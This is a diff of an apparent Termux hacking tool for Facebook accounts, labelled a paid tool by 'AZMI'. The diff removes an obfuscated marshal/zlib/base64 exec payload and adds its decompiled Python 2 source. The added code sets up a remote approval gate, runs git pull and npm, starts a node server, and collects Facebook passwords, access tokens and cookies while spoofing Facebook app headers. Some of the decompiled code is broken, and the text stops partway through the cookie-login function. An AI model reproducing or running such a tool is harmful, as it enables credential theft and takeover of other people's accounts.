@@ -1,2 +1,1198 @@
-import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b64decode("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"))))
+# -*- coding: utf-8 -*-
+# uncompyle6 version 3.7.4
+# Python bytecode 2.7
+# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
+# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
+# Embedded file name: dg
+
+import os, sys, time, datetime, re, threading, json, random, requests, getpass, hashlib, cookielib, uuid, string
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+__author__ = 'AZMI'
+
+os.system('termux-setup-storage')
+try:
+    os.mkdir('/sdcard/ids')
+except OSError:
+    pass
+
+bd = random.randint(20000000.0, 30000000.0)
+sim = random.randint(20000, 40000)
+header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 
+   'x-fb-connection-quality': 'EXCELLENT', 
+   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
+   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 
+   'content-type': 'application/x-www-form-urlencoded', 
+   'x-fb-http-engine': 'Liger'}
+os.system('git pull')
+os.system('clear')
+reload(sys)
+sys.setdefaultencoding("utf8")
+
+#Dev:
+#### LOGO ####
+logo = """
+\033[0;34m     █████  ███████ ███    ███ ██
+\033[1;34m    ██   ██      ██ ████  ████ ██
+\033[0;94m    ███████   ███   ██ ████ ██ ██
+\033[1;94m    ██   ██ ██      ██  ██  ██ ██
+\033[1;34m    ██   ██ ███████ ██      ██ ██
+\n\x1b[1;96m-----------------------------------------------
+\x1b[1;92m       AUTHOR    : AZMI
+\x1b[1;92m       WHATSAPP  : MAI NAHI BATAOGI
+\x1b[1;96m                 : THIS IS PAID TOOL
+\x1b[1;96m-------- \x1b[1;93mXzee\x1b[1;96m ---------------------------------
+     """
+
+def reg():
+    os.system('clear')
+    print logo
+    print ("")
+    CorrectUsername = 'Xzee007'
+    username = raw_input('  \x1b[1;93mENTER KEY: ')
+    if username == CorrectUsername:
+        print ("\x1b[1;95m ")
+        print ("\x1b[1;32;1m WELCOME TO MY TOOL")
+        time.sleep(5)
+        print ("ACTIVATED")
+        os.system('clear')
+    else:
+        print ("ACTIVATED")
+        os.system('clear')
+    print ''
+    time.sleep(1)
+    try:
+        to = open('/sdcard/.Azmi.txt', 'r').read()
+    except (KeyError, IOError):
+        reg2()
+
+    r = requests.get('https://raw.githubusercontent.com/xzmi007/Xzee/main/server.txt').text
+    if to in r:
+        os.system('clear')
+        print(logo)
+        print("")
+        os.system('cd ..... && npm install')
+        os.system('fuser -k 5000/tcp &')
+        os.system('#')
+        os.system('cd ..... && node index.js &')
+        time.sleep(5)
+        ip()
+    else:
+        os.system('clear')
+        print logo
+        print '    \x1b[1;37mApproved Failed'
+        print ' \x1b[1;92mYour Id Is Not Approved Already '
+        print ' \x1b[1;92mCopy the id and send to owner'
+        print ' \x1b[1;96mYour id: ' + to
+        raw_input('\x1b[1;93m Press enter to send id')
+        os.system('xdg-open https://wa.me/+923459690608')
+        reg()
+
+
+def reg2():
+    os.system('clear')
+    print logo
+    print '    \x1b[1;37mApproval not detected'
+    print ' \x1b[1;92mCopy and press enter , then select WhatsApp to continue'
+    id = uuid.uuid4().hex[:50]
+    print ' Your id: ' + id
+    print ''
+    raw_input(' Press enter to go to WhatsApp ')
+    os.system('xdg-open https://wa.me/+923459690608')
+    sav = open('/sdcard/.AZMI.txt', 'w')
+    sav.write(id)
+    sav.close()
+    raw_input('\x1b[1;92m Press enter to check Approval ')
+    reg()
+
+
+def ip():
+    os.system('clear')
+    print logo
+    print '\tCollecting device info'
+    try:
+        ipinfo = requests.get('http://ip-api.com/json/')
+        z = json.loads(ipinfo.text)
+        ips = z['query']
+        country = z['country']
+        regi = z['regionName']
+        network = z['isp']
+    except:
+        pass
+
+    print '\x1b[1;92m Your ip: ' + ips
+    time.sleep(1)
+    print '\x1b[1;92m Your country: ' + country
+    time.sleep(1)
+    print '\x1b[1;92m Your region: ' + regi
+    time.sleep(1)
+    print ' \x1b[1;92mYour network: ' + network
+    time.sleep(1)
+    print ' Loading ...'
+    time.sleep(1)
+    log_menu()
+
+
+
+def log_menu():
+    try:
+        t_check = open('access_token.txt', 'r')
+        menu()
+    except (KeyError, IOError):
+        os.system('clear')
+        print logo
+        print '\x1b[1;93m ~~~~ Login menu ~~~~\x1b[1;91m'
+        print 47 * '-'
+        print '\x1b[1;92m[1] Login with FaceBook'
+        print '\x1b[1;92m[2] Login with token'
+        print '\x1b[1;92m[3] Login with cookies'
+        print ''
+        log_menu_s()
+
+
+def log_menu_s():
+    s = raw_input('==>')
+    if s == '1':
+        log_fb()
+    elif s == '2':
+        log_token()
+    elif s == '3':
+        log_cookie()
+    else:
+        print ''
+        print '\\ Select valid option '
+        print ''
+        log_menu_s()
+
+
+def log_fb():
+    os.system('clear')
+    print logo
+    print '\x1b[1;31;1mLogin with id/pass'
+    print 47 * '-'
+    lid = raw_input('\x1b[1;92m Id/mail/no: ')
+    pwds = raw_input(' \x1b[1;93mPassword: ')
+    try:
+        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
+        q = json.loads(data)
+        if 'loc' in q:
+            ts = open('access_token.txt', 'w')
+            ts.write(q['loc'])
+            ts.close()
+            menu()
+        elif 'www.facebook.com' in q['error']:
+            print ' User must verify account before login'
+            raw_input('\x1b[1;92m Press enter to try again ')
+            log_fb()
+        else:
+            print ' Id/Pass may be wrong'
+            raw_input(' \x1b[1;92mPress enter to try again ')
+            log_fb()
+    except:
+        print ''
+        print 'Exiting tool'
+        os.system('exit')
+
+
+def log_token():
+    os.system('clear')
+    print logo
+    print '\x1b[1;93mLogin with token\x1b[1;91m'
+    print 47 * '-'
+    tok = raw_input(' \x1b[1;92mPaste token here: \x1b[1;91m')
+    print 47 * '-'
+    t_s = open('access_token.txt', 'w')
+    t_s.write(tok)
+    t_s.close()
+    menu()
+
+
+def log_cookie():
+    os.system('clear')
+    print logo
+    print ''
+    print '\x1b[1;31;1mLogin Cookies'
+    print ''
+    try:
+        cookie = raw_input(' Paste cookies here: ')
+        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'referer': 'https://m.facebook.com/', 'host': 'm.facebook.com', 
+           'origin': 'https://m.facebook.com', 
+           'upgrade-insecure-requests': '1', 
+           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
+           'cache-control': 'max-age=0', 
+           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
